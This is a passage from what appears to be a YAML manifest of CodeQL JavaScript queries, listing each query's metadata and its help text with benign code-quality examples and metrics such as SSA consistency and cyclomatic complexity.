        A string literal appears to use template syntax but is not quoted
        with backticks.
      kind: problem
      problem.severity: warning
      id: js/template-syntax-in-string-literal
      precision: high
      tags: |-
        quality
               reliability
               correctness
               language-features
    queryHelp: |
      # Template syntax in string literal
      Template literals are strings enclosed with backticks (``` `` ```). These may contain placeholder expressions with the syntax `${*..*}`, which are evaluated at runtime and inserted as part of the string.

      Ordinary string literals may be enclosed by single (`''`) or double quotes (`""`), and the placeholder syntax `${*..*}` has no special meaning in these.

      In files that make use of template literals, it is hard to distinguish actual template literals from ordinary strings that happen to contain placeholder syntax. This is often the result of mistyping the quotes on a template literal.


      ## Recommendation
      Consider if this was intended to be a template literal, and if so, change the quotes to backticks (``` `` ```). Alternatively:

      * Rename some local variables so that the placeholders do not give the impression of referencing those.
      * Avoid mixing JavaScript template literals with other template systems in the same file.

      ## Example
      In the following example, the call to `log.error` will log the string "`${id}`", rather than the contents of the `id` variable.


      ```javascript
      log.info(`Connecting to ${id}`)
      let connection = openConnection(id)
      if (!connection) {
        log.error('Could not connect to ${id}')
      }

      ```
      To correct the error message, change the quotes to backticks:


      ```javascript
      log.info(`Connecting to ${id}`)
      let connection = openConnection(id)
      if (!connection) {
        log.error(`Could not connect to ${id}`)
      }

      ```

      ## References
      * Mozilla Developer Network: [Template literals](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Template_literals).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/ThisBeforeSuper.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/ThisBeforeSuper.bqrs
    metadata:
      name: Use of incompletely initialized object
      description: |-
        Accessing 'this' or a property of 'super' in the constructor of a
                      subclass before calling the super constructor will cause a runtime error.
      kind: problem
      problem.severity: error
      id: js/incomplete-object-initialization
      tags: |-
        quality
               reliability
               correctness
               language-features
      precision: high
    queryHelp: |
      # Use of incompletely initialized object
      If a class extends another class, its constructor needs to call the super constructor before referencing `this` or accessing properties through `super`. Failure to do so will cause a runtime error.


      ## Recommendation
      Insert a super constructor call.


      ## Example
      In the following example, class `A` extends class `B`, but its constructor assigns to `this.x` without first invoking the super constructor, which will cause a runtime error.

      ```javascript

      class A extends B {
        constructor() { this.x = 42; }
      }

      ```
      To prevent the error, a super constructor call should be inserted:

      ```javascript

      class A extends B {
        constructor() { super(); this.x = 42; }
      }

      ```

      ## References
      * Mozilla Developer Network: [Sub classing with extends](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes#Sub_classing_with_extends).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/UnusedIndexVariable.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/UnusedIndexVariable.bqrs
    metadata:
      name: Unused index variable
      description: |-
        Iterating over an array but not using the index variable to access array elements
                      may indicate a typo or logic error.
      kind: problem
      problem.severity: warning
      id: js/unused-index-variable
      precision: high
      tags: |-
        quality
               reliability
               correctness
    queryHelp: |
      # Unused index variable
      If the loop variable of a `for` loop ranges over the indices of an array, that variable would normally be used as an array index in the body of the loop. If, instead, the loop body only refers to array elements at constant indices, this may indicate a logic error or leftover testing code.


      ## Recommendation
      Examine the loop carefully to ensure it is behaving as expected. You may want to consider using a `for`-`of` loop to iterate over all elements of an array without the need for error-prone index manipulations.


      ## Example
      The following example shows a function that is intended to sum up the elements of an array `xs`. The loop variable `i` is counted up from zero to `xs.length-1`, but instead of adding `xs[i]` to the running sum `res`, the code adds `xs[0]`, the first element of `xs`, to it, which is likely a mistake:


      ```javascript
      function sum(xs) {
        var res = 0;
        for(var i=0; i<xs.length; ++i)
          res += xs[0]; // BAD: should be xs[i]
        return res;
      }

      ```
      The problem can be fixed by adding `xs[i]` instead:


      ```javascript
      function sum(xs) {
        var res = 0;
        for(var i=0; i<xs.length; ++i)
          res += xs[i];
        return res;
      }

      ```
      Alternatively, the function can be written more succinctly using a `for`-`of` loop:


      ```javascript
      function sum(xs) {
        var res = 0;
        for(var x of xs)
          res += x;
        return res;
      }

      ```

      ## References
      * Mozilla Developer Network: [for](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for)
      * Mozilla Developer Network: [for...of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/WithStatement.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/WithStatement.bqrs
    metadata:
      name: With statement
      description: The 'with' statement has subtle semantics and should not be used.
      kind: problem
      problem.severity: warning
      id: js/with-statement
      tags: |-
        quality
               maintainability
               complexity
               language-features
      precision: very-high
    queryHelp:
      "# With statement\nThe `with` statement provides a shorthand when accessing\
      \ many properties of the same object. If a property is not found on that object,\
      \ enclosing scopes are searched for a variable of the same name. This is confusing\
      \ and makes code brittle and hard to read. For this reason, `with` is best avoided.\n\
      \n\n## Recommendation\nEliminate `with` statements by introducing explicit property\
      \ accesses.\n\n\n## Example\nThe following code snippet reads properties `firstName`,\
      \ `lastName` and `email` from the object stored in `record` by means of a `with`\
      \ statement. It also invokes the `addRecord` function, which is presumably defined\
      \ in an enclosing scope.\n\n\n```javascript\nfunction process(record) {\n\twith\
      \ (record) {\n\t\taddRecord(firstName + \" \" + lastName, email);\n\t}\n}\n```\n\
      Note that if `record` does not have any of the properties `firstName`, `lastName`\
      \ or `email`, they will be looked up as variables in enclosing scopes. Conversely,\
      \ if it should happen to have a property `addRecord`, the function call will attempt\
      \ to invoke the value of this property as a method.\n\nTo clarify the intended\
      \ meaning of the code, the `with` statement should be removed and property accesses\
      \ should be introduced to make it explicit which names are intended to be read\
      \ from `record`, and which ones are intended to be looked up in enclosing scopes:\n\
      \n\n```javascript\nfunction process(record) {\n\taddRecord(record.firstName +\
      \ \" \" + record.lastName, record.email);\n}\n```\nNote that `with` statements\
      \ are not allowed in strict mode code.\n\n\n## References\n* D. Crockford, *JavaScript:\
      \ The Good Parts*, Appendix B.2. O'Reilly, 2008.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/WrongExtensionJSON.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/WrongExtensionJSON.bqrs
    metadata:
      name: JSON in JavaScript file
      description: Storing JSON in files with extension 'js' or 'jsx' is error-prone.
      kind: problem
      problem.severity: recommendation
      id: js/json-in-javascript-file
      tags: |-
        maintainability
               language-features
      precision: low
    queryHelp: |
      # JSON in JavaScript file
      JSON data should normally be stored in files with extension 'json'. If it is stored in files with extension 'js' or 'jsx' (which are normally associated with JavaScript), developers might attempt to parse or execute the JSON data as JavaScript, which can lead to parse errors.


      ## Recommendation
      Rename the file to have extension 'json'.


      ## References
      * Internet Engineering Taskforce: [RFC 7159: The JavaScript Object Notation (JSON) Data Interchange Format](https://tools.ietf.org/html/rfc7159).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: LanguageFeatures/YieldInNonGenerator.ql
    relativeBqrsPath: codeql/javascript-queries/LanguageFeatures/YieldInNonGenerator.bqrs
    metadata:
      name: Yield in non-generator function
      description: "'yield' should only be used in generator functions."
      kind: problem
      problem.severity: error
      id: js/yield-outside-generator
      tags: |-
        quality
               reliability
               correctness
               language-features
               external/cwe/cwe-758
      precision: very-high
    queryHelp: |
      # Yield in non-generator function
      Previous versions of SpiderMonkey permitted the use of `yield` expressions in functions not marked as generators. This is no longer supported, and is not compliant with ECMAScript 2015.


      ## Recommendation
      Mark the enclosing function as a generator by replacing `function` with `function*`.


      ## Example
      The following example uses `yield` to produce a sequence of indices, but the function `idMaker` is not marked as a generator:


      ```javascript
      function idMaker(){
          var index = 0;
          while(true)
              yield index++;
      }

      ```
      This is easily fixed by adding an asterisk to the `function` keyword:


      ```javascript
      function* idMaker(){
          var index = 0;
          while(true)
              yield index++;
      }

      ```

      ## References
      * Mozilla Developer Network: [function\*](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function*).
      * Mozilla Developer Network: [yield](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/yield).
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/CallGraph.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/CallGraph.bqrs
    metadata:
      name: Call graph
      description: An edge in the call graph.
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/call-graph
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/ImportGraph.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/ImportGraph.bqrs
    metadata:
      name: Import graph
      description: An edge in the import graph.
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/import-graph
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/LibraryInputs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/LibraryInputs.bqrs
    metadata:
      name: Library inputs
      description: An input coming from the client of a library
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/library-inputs
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/TaintedNodes.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/TaintedNodes.bqrs
    metadata:
      name: Tainted expressions
      description: |-
        The number of expressions reachable from a remote flow source
                      via default taint-tracking steps.
      kind: problem
      problem.severity: recommendation
      tags: meta-expensive
      id: js/meta/alerts/tainted-nodes
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/TaintSinks.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/TaintSinks.bqrs
    metadata:
      name: Taint sinks
      description: Sinks that are sensitive to untrusted data.
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/taint-sinks
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/TaintSources.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/TaintSources.bqrs
    metadata:
      name: Taint sources
      description: Sources of untrusted input.
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/taint-sources
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/alerts/ThreatModelSources.ql
    relativeBqrsPath: codeql/javascript-queries/meta/alerts/ThreatModelSources.bqrs
    metadata:
      name: Threat model sources
      description:
        Sources of possibly untrusted input that can be configured via threat
        models.
      kind: problem
      problem.severity: recommendation
      id: js/meta/alerts/threat-model-sources
      tags: meta
      precision: very-low
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/CalledFunctionCandidates.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/CalledFunctionCandidates.bqrs
    metadata:
      name: Called function candidates
      description: |-
        The number of functions for which finding call sites is relevant
                       for analysis quality.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/called-function-candidates
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/CalledFunctionRatio.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/CalledFunctionRatio.bqrs
    metadata:
      name: Called function ratio
      description: The percentage of relevant functions for which a call site was found.
      kind: metric
      metricType: project
      metricAggregate: sum min max avg
      tags: meta
      id: js/meta/called-function-ratio
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/CalledFunctions.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/CalledFunctions.bqrs
    metadata:
      name: Called functions
      description: The number of functions for which a call site was found.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/called-functions
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/DomValueRefs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/DomValueRefs.bqrs
    metadata:
      name: DOM value references
      description: The number of references to a DOM value.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/dom-value-refs
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/NumModules.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/NumModules.bqrs
    metadata:
      name: Modules
      description: The number of modules in the snapshot.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/modules
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/ResolvableCallCandidates.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/ResolvableCallCandidates.bqrs
    metadata:
      name: Resolvable call site candidates
      description: The number of non-external calls in the program.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/resolvable-call-candidates
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/ResolvableCallRatio.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/ResolvableCallRatio.bqrs
    metadata:
      name: Resolvable call ratio
      description: The percentage of non-external calls that can be resolved to a target.
      kind: metric
      metricType: project
      metricAggregate: sum min max avg
      tags: meta
      id: js/meta/resolvable-call-ratio
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/ResolvableCalls.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/ResolvableCalls.bqrs
    metadata:
      name: Resolvable calls
      description: The number of calls that could be resolved to its target.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/resolvable-calls
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/ResolvableImports.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/ResolvableImports.bqrs
    metadata:
      name: Resolvable imports
      description: The number of imports that could be resolved to its target.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/resolvable-imports
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/RouteHandlers.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/RouteHandlers.bqrs
    metadata:
      name: Route handlers
      description: The number of HTTP route handler functions found.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/route-handlers
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/SanitizersReachableFromSource.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/SanitizersReachableFromSource.bqrs
    metadata:
      name: Sanitizers reachable from source
      description: The number of sanitizers reachable from a recognized taint source.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/sanitizers-reachable-from-source
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/SinksReachableFromSanitizer.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/SinksReachableFromSanitizer.bqrs
    metadata:
      name: Sinks reachable from sanitizer
      description: The number of sinks reachable from a recognized sanitizer call.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/sinks-reachable-from-sanitizer
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/TaintedNodes.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/TaintedNodes.bqrs
    metadata:
      name: Tainted expressions
      description: |-
        The number of expressions reachable from a remote flow source
                      via default taint-tracking steps.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/tainted-nodes
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/TaintSinks.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/TaintSinks.bqrs
    metadata:
      name: Taint sinks
      description: The number of high-severity taint sinks.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/taint-sinks
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/TaintSources.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/TaintSources.bqrs
    metadata:
      name: Taint sources
      description: The number of remote flow sources and document.location sources
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/taint-sources
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/TaintSteps.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/TaintSteps.bqrs
    metadata:
      name: Taint steps
      description: The number of default taint steps.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/taint-steps
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UncalledFunctions.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UncalledFunctions.bqrs
    metadata:
      name: Uncalled functions
      description: The number of functions for which no call site could be found.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/uncalled-functions
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UnmodelledSteps.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UnmodelledSteps.bqrs
    metadata:
      name: Unmodeled step
      description:
        A potential step from an argument to a return that has no data/taint
        step.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/unmodeled-step
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UnpromotedRouteHandlerCandidate.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UnpromotedRouteHandlerCandidate.bqrs
    metadata:
      name: Unpromoted route handler candidate
      description:
        "If a function that looks like a route handler is not detected as\
        \ such, this may indicate incomplete library modeling."
      kind: problem
      problem.severity: warning
      precision: low
      id: js/unpromoted-route-handler-candidate
      tags: analysis-quality
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UnpromotedRouteSetupCandidate.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UnpromotedRouteSetupCandidate.bqrs
    metadata:
      name: Unpromoted route setup candidate
      description:
        "If a call that looks like a route setup is not detected as such,\
        \ this may indicate incomplete library modeling."
      kind: problem
      problem.severity: warning
      precision: low
      id: js/unpromoted-route-setup-candidate
      tags: analysis-quality
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UnresolvableCalls.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UnresolvableCalls.bqrs
    metadata:
      name: Unresolvable calls
      description: The number of calls that could not be resolved to a target.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/unresolvable-calls
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/analysis-quality/UnresolvableImports.ql
    relativeBqrsPath: codeql/javascript-queries/meta/analysis-quality/UnresolvableImports.bqrs
    metadata:
      name: Unresolvable imports
      description: The number of imports that could not be resolved to a module.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/unresolvable-imports
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/ApiGraphs/ApiGraphEdges.ql
    relativeBqrsPath: codeql/javascript-queries/meta/ApiGraphs/ApiGraphEdges.bqrs
    metadata:
      name: API-graph edges
      description: The number of edges (other than points-to edges) in the API graph.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/api-graph-edges
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/ApiGraphs/ApiGraphNodes.ql
    relativeBqrsPath: codeql/javascript-queries/meta/ApiGraphs/ApiGraphNodes.bqrs
    metadata:
      name: API-graph nodes
      description: The number of nodes in the API graph.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/api-graph-nodes
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/ApiGraphs/ApiGraphPointsToEdges.ql
    relativeBqrsPath: codeql/javascript-queries/meta/ApiGraphs/ApiGraphPointsToEdges.bqrs
    metadata:
      name: API-graph points-to edges
      description: The number of points-to edges in the API graph.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/api-graph-points-to-edges
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/ApiGraphs/ApiGraphRhsNodes.ql
    relativeBqrsPath: codeql/javascript-queries/meta/ApiGraphs/ApiGraphRhsNodes.bqrs
    metadata:
      name: API-graph right-hand-side nodes
      description: |-
        The number of data-flow nodes corresponding to a right-hand side of
                      a definition of an API-graph node.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/api-graph-rhs-nodes
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/ApiGraphs/ApiGraphUseNodes.ql
    relativeBqrsPath: codeql/javascript-queries/meta/ApiGraphs/ApiGraphUseNodes.bqrs
    metadata:
      name: API-graph use nodes
      description:
        The number of data-flow nodes corresponding to a use of an API-graph
        node.
      kind: metric
      metricType: project
      metricAggregate: sum
      tags: meta
      id: js/meta/api-graph-use-nodes
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/Consistency.ql
    relativeBqrsPath: codeql/javascript-queries/meta/Consistency.bqrs
    metadata:
      name: Violation of API contract
      description: |-
        If the snapshot database or the QL library violates an API contract described
                      in the documentation, queries that rely on the contract may yield unexpected
                      results.
      kind: table
      id: js/consistency/api-contracts
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/extraction-metrics/FileData.ql
    relativeBqrsPath: codeql/javascript-queries/meta/extraction-metrics/FileData.bqrs
    metadata:
      name: Extraction metrics file data
      description:
        Extraction metrics and related information for profiling the extraction
        of individual files.
      kind: table
      id: js/meta/extraction/file-data
      tags: meta
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/extraction-metrics/MissingMetrics.ql
    relativeBqrsPath: codeql/javascript-queries/meta/extraction-metrics/MissingMetrics.bqrs
    metadata:
      name: File with missing extraction metrics
      description: A file missing extraction metrics is indicative of a faulty extractor.
      kind: problem
      problem.severity: warning
      precision: low
      id: js/meta/extraction/missing-metrics
      tags: meta
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/extraction-metrics/PhaseTimings.ql
    relativeBqrsPath: codeql/javascript-queries/meta/extraction-metrics/PhaseTimings.bqrs
    metadata:
      name: Extractor phase timings
      description: An overview of how time was spent during extraction
      kind: table
      id: js/meta/extraction/phase-timings
      tags: meta
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/DeadDef.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/DeadDef.bqrs
    metadata:
      name: Dead SSA definition
      description: Each SSA definition should have at least one use.
      kind: problem
      problem.severity: error
      id: js/consistency/dead-ssa-definition
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/Dominance.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/Dominance.bqrs
    metadata:
      name: SSA definition does not dominate use
      description: |-
        Every use of an SSA variable should be dominated by its
                      definition.
      kind: problem
      problem.severity: error
      id: js/consistency/non-dominating-ssa-definition
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/MultipleDefs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/MultipleDefs.bqrs
    metadata:
      name: Variable use with more than one corresponding SSA variable
      description: |-
        Every reachable use of an SSA-convertible variable should correspond to
                      exactly one SSA variable.
      kind: problem
      problem.severity: error
      id: js/consistency/ambiguous-ssa-definition
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/MultipleRefinementInputs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/MultipleRefinementInputs.bqrs
    metadata:
      name: Refinement node with more than one input
      description: Every SSA refinement node should have exactly one input.
      kind: problem
      problem.severity: error
      id: js/consistency/ambiguous-refinement-node
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/NoDefs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/NoDefs.bqrs
    metadata:
      name: Variable use with no corresponding SSA variable
      description: |-
        Every reachable use of an SSA-convertible variable should correspond to
                      exactly one SSA variable.
      kind: problem
      problem.severity: error
      id: js/consistency/dead-ssa-use
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/NoPhiInputs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/NoPhiInputs.bqrs
    metadata:
      name: Phi node without inputs
      description: Every SSA phi node should have two or more inputs.
      kind: problem
      problem.severity: error
      id: js/consistency/dead-phi-node
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/NoRefinementInputs.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/NoRefinementInputs.bqrs
    metadata:
      name: Refinement node without inputs
      description: Every SSA refinement node should have exactly one input.
      kind: problem
      problem.severity: error
      id: js/consistency/dead-refinement-node
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: meta/SSA/SinglePhiInput.ql
    relativeBqrsPath: codeql/javascript-queries/meta/SSA/SinglePhiInput.bqrs
    metadata:
      name: Phi node with a single input
      description: Every SSA phi node should have two or more inputs.
      kind: problem
      problem.severity: error
      id: js/consistency/trivial-phi-node
      tags: consistency
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/Dependencies/ExternalDependencies.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/Dependencies/ExternalDependencies.bqrs
    metadata:
      deprecated: ''
      name: External dependencies
      description: |-
        Count the number of dependencies a JavaScript source file has on
                      NPM packages or framework libraries.
      kind: treemap
      treemap.warnOn: highValues
      metricType: externalDependency
      id: js/external-dependencies
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/Dependencies/ExternalDependenciesSourceLinks.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/Dependencies/ExternalDependenciesSourceLinks.bqrs
    metadata:
      deprecated: ''
      name: External dependency source links
      kind: source-link
      metricType: externalDependency
      id: js/dependency-source-links
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FCommentRatio.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FCommentRatio.bqrs
    metadata:
      name: Comment ratio in files
      description: The percentage of lines in a file that contain comments.
      kind: treemap
      treemap.warnOn: lowValues
      metricType: file
      metricAggregate: avg max
      tags: maintainability
      id: js/comment-ratio-per-file
    queryHelp: |
      # Comment ratio in files
      This metric measures the percentage of a file's lines that are comment rather than code.

      A low percentage of comments in a file may indicate either a potentially worrying lack of documentation or that the file was generated by an automated tool. A quick visual inspection should be sufficient to distinguish between the two cases.


      ## Recommendation
      Files that were not auto-generated and have a low comment percentage should be documented more fully. Refer to \[McConnell\] for more on how to write good comments.


      ## References
      * S. McConnell. *Code Complete*, 2nd Edition. Microsoft Press, 2004.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FCyclomaticComplexity.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FCyclomaticComplexity.bqrs
    metadata:
      name: Average cyclomatic complexity of files
      description: The average cyclomatic complexity of the functions in a file.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg max
      tags: testability
      id: js/cyclomatic-complexity-per-file
    queryHelp: |
      # Average cyclomatic complexity of files
      This metric measures the average cyclomatic complexity of the functions in a file.

      The cyclomatic complexity of a function is the number of linearly independent execution paths through that function. A path is linearly independent path if it differs from all other paths by at least one node. Straight-line code therefore has a cyclomatic complexity of one, while branches, switches and loops increase cyclomatic complexity.

      Functions with a high cyclomatic complexity are typically hard to understand and test. By extension, files whose functions have a high average cyclomatic complexity are problematic, and usually would benefit from refactoring.

      As a concrete example, consider the following function:


      ```javascript
      function f(i, j) {
          // start
          var result;
          if(i % 2 == 0) {
              // iEven
              result = i + j;
          }
          else {
              // iOdd
              if(j % 2 == 0) {
                  // jEven
                  result = i * j;
              }
              else {
                  // jOdd
                  result = i - j;
              }
          }
          return result;
          // end
      }
      ```
      The control flow graph for this function is as follows:

      ![Control Flow Graph](./FCyclomaticComplexity_ControlFlow.png)The graph shows that the number of linearly independent execution paths through the function, and hence its cyclomatic complexity, is `3`. The three paths are:

      * `start -> iEven -> end`
      * `start -> iOdd -> jEven -> end`
      * `start -> iOdd -> jOdd -> end`

      ## Recommendation
      Functions with a high cyclomatic complexity should be simplified, for instance by tidying up any complex logic within them or by splitting them into multiple methods using the Extract Method refactoring.


      ## References
      * M. Fowler, *Refactoring*. Addison-Wesley, 1999.
      * T. J. McCabe, *A Complexity Measure*. IEEE Transactions on Software Engineering, SE-2(4), December 1976.
      * Dave Thomas, [Refactoring as Meta Programming?](http://www.jot.fm/issues/issue_2005_01/column1/), in Journal of Object Technology, vol. 4, no. 1, January-February 2005, pp. 7-11.
      * Wikipedia: [Cyclomatic complexity](http://en.wikipedia.org/wiki/Cyclomatic_complexity)
      * Wikipedia: [Code refactoring](http://en.wikipedia.org/wiki/Code_refactoring)
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FFunctions.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FFunctions.bqrs
    metadata:
      name: Number of functions in files
      description: The number of functions in a file.
      kind: treemap
      treemap.warnOn: highValues
      metricType: file
      metricAggregate: avg sum max
      id: js/functions-per-file
    queryHelp: |
      # Number of functions in files
      This metric measures the number of functions in each file.

      Tracking this metric over time will indicate which parts of the system are under active development. Cross-referencing with the other metrics "Cyclomatic Complexity" and "Lines of Code" is recommended, because files with high values for all three metrics are very likely to be too big and unwieldy; such files should be split up.


      ## Recommendation
      If a file is too big, identify the different tasks that are carried out by its functions and split the file according to these tasks.


      ## References
      * M. Fowler, *Refactoring*. Addison-Wesley, 1999.
      * Wikipedia: [Code refactoring](https://en.wikipedia.org/wiki/Code_refactoring).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Metrics/FLines.ql
    relativeBqrsPath: codeql/javascript-queries/Metrics/FLines.bqrs
    metadata:
      name: Number of lines in files
      description: The number of lines in each file.
      kind: treemap
      treemap.warnOn: highValues
